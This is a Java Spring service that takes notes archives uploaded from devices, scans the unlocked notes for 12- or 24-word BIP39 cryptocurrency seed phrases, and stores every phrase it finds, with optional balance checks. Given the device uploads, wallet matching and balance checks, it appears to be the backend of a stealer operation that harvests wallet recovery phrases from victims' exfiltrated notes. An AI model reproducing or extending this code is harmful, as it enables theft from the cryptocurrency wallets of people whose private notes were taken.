package com.consumer.service;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Service;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.consumer.config.V26ConsumerProperties;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.UploadFileDao;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.UploadFileEntity;
import com.consumer.parse.NotesParse;
import com.consumer.parse.ParsedNote;
import com.consumer.parse.WalletMatcher;
import com.consumer.util.Bip39Util;
import com.consumer.util.UploadPaths;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class NotesMnemonicService {

    private final DeviceDao deviceDao;
    private final UploadFileDao uploadFileDao;
    private final V26ConsumerProperties props;
    private final NotesParse notesParse;
    private final Bip39Util bip39Util;
    private final MnemonicStoreService mnemonicStoreService;

    public Map<String, Object> process(String deviceId) {
        Map<String, Object> out = new LinkedHashMap<>();
        String did = StringUtils.trimToEmpty(deviceId);
        if (did.isEmpty()) {
            out.put("ok", false);
            out.put("error", "empty_device_id");
            return out;
        }
        DeviceEntity device = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", did).last("LIMIT 1"));
        if (device == null && !did.equals(did.toLowerCase())) {
            device = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", did.toLowerCase()).last("LIMIT 1"));
        }
        if (device == null) {
            out.put("ok", false);
            out.put("error", "device_not_found");
            return out;
        }
        did = device.getDeviceId();
        List<UploadFileEntity> uploads = uploadFileDao.selectList(new QueryWrapper<UploadFileEntity>()
                .eq("deviceId", did).orderByDesc("created_at").orderByDesc("id"));
        List<Path> notesPaths = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (UploadFileEntity u : uploads) {
            if (!WalletMatcher.isNotesArchiveName(u.getFileName())) {
                continue;
            }
            Path path = UploadPaths.resolveDiskPath(props.getUploadDir(), u.getDiskPath());
            if (path == null) {
                continue;
            }
            String key = path.toAbsolutePath().toString();
            if (seen.add(key)) {
                notesPaths.add(path);
            }
        }
        if (notesPaths.isEmpty()) {
            out.put("ok", true);
            out.put("device_id", did);
            out.put("notes_files", 0);
            out.put("phrase_count", 0);
            out.put("mnemonic_added", 0);
            out.put("skipped", "no_notes_file");
            return out;
        }
        Set<String> phrases = new LinkedHashSet<>();
        int noteRows = 0;
        for (Path path : notesPaths) {
            List<ParsedNote> notes = notesParse.parseArchive(path);
            noteRows += notes.size();
            for (ParsedNote n : notes) {
                if (n.isLocked()) {
                    continue;
                }
                for (String chunk : new String[] {n.getTitle(), n.getBody(), n.getSnippet()}) {
                    if (StringUtils.isBlank(chunk)) {
                        continue;
                    }
                    phrases.addAll(bip39Util.scanAllMnemonics(chunk, 24, 12));
                }
            }
        }
        if (phrases.isEmpty()) {
            log.info("notes mnemonic: no bip39 phrase device={} files={} notes={}", did, notesPaths.size(), noteRows);
            out.put("ok", true);
            out.put("device_id", did);
            out.put("notes_files", notesPaths.size());
            out.put("note_count", noteRows);
            out.put("phrase_count", 0);
            out.put("mnemonic_added", 0);
            return out;
        }
        List<String[]> items = new ArrayList<>();
        for (String p : phrases) {
            items.add(new String[] {"memorandum", p});
        }
        boolean defer = props.getConsumer().isDeferBalance();
        MnemonicStoreService.PersistResult persist = mnemonicStoreService.finalizeRecovered(
                did, device.getAppId(), items, !defer, !defer, false);
        log.info("notes mnemonic done device={} files={} notes={} phrases={} added={}",
                did, notesPaths.size(), noteRows, phrases.size(), persist.getAdded());
        out.put("ok", true);
        out.put("device_id", did);
        out.put("notes_files", notesPaths.size());
        out.put("note_count", noteRows);
        out.put("phrase_count", phrases.size());
        out.put("mnemonic_added", persist.getAdded());
        out.put("new_ids", persist.getNewIds());
        return out;
    }
}
